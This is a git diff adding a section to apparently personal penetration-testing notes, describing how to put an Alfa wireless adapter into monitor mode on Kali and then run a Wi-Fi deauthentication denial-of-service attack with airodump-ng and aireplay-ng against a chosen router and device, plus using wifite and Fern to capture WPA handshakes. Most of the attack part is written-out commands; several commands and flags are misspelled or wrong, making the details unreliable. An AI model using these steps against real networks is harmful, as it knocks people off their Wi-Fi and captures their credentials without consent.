@@ -783,7 +783,77 @@ $ gobuster
 
 - X-Forwarded Host?
 
+####### Network Adapters ########
 
+- Alfa WUSO36ACH Network Adapter
+	- Unplugged
+		- sudo apto-get update
+		- sudo apt-get upgrade
+	- Plug in
+		- vmware -> player -> removavle devices -> Realtek 802.11n NIC -> Connecect(Disconnect from Host)
+		- Check to see USB device is being recognized
+			- $ lsusb
+	- Driver Install
+		- sudo apt install realtek-rtl88xxau-dkms
+	- $ iwconig
+		- This will check if Alfa adapter is connecting properly
+	- Shutdown Alfa wlan0 network
+		- sudo ifconfig wlan0 down
+	- Kill remaiaining running tasks
+		- sudo airmon-ng check kill
+	- Set network mode from Manager to Monitor
+		- iwconfig wlan0 mode monitor
+	- Turn the wlan0 network back on
+		- sudo ifconfig wlan0 up
+
+- DOS (Denial of Service)
+	- setup
+		- Shut down network and kill processes
+		- Make sure network is in monitor mode
+		- Spin network back up
+	- Check Wifi Access within reach of addapter
+		- $ sudo airodump-ng --band a wlan0
+			- band = 2.4 or 5 ghz
+			- a = 5ghz (802.11a)
+			- b = 2.4ghz (802.11b)
+			- g = 2.4ghz (802.11g) [an improved b]
+	- Choose a target
+		-Find AP MAC address
+			- $ sudo airodump-ng --bssid "BSSID" --channel 'CH' --write file.txt wlan0
+				- --bssid = MAC Address (media access control) Router Access Point (AP)
+				- --channel = matches 'CH' column in results
+				- --write = to document packets to out file
+				- wlan0 = my adaptor netowrk name
+		- Choose a Device MAC address to attack
+			- While command is running open new tab in terminal
+		- Run DOS Attack
+			- In new terminal tab
+				- $ airoplay-ng --deauth 100000 -a 'Router MAC' -c 'Device MAC' -D wlan0
+					- --deauth = Deny authentication for an amount of time
+					- -a = MAC address for wifi router
+					- -c = MAC address of device connected on wifi router
+					- -D = 5ghz
+					- wlan0 = Alfa adapter network name
+			
+
+$ wifite
+	- Does what I did above just with more automation
+	- $ sudo wifite --no-pmkid
+		- Automacticaly starts pulling down networks in range
+
+# Handshake
+	- Getting a 'handshake'
+		- Running a deauthorization commands against devices on netowrk
+			- kick phone off network
+			- Allow for enough time for phone to reconnect to network
+			- Handshake (passing of creds) caught and stored
+
+# Fern (kali app)
+	- A GUI version of wifite
+	- Open with root passwd and switch interface to my wlan0
+	- Adjust Monitor mode
+		- $ sudo ip link set wlan0 down
+		- $ sudo ip link set wlan0 name wlan0mon
 
 
 $ Juice Shop
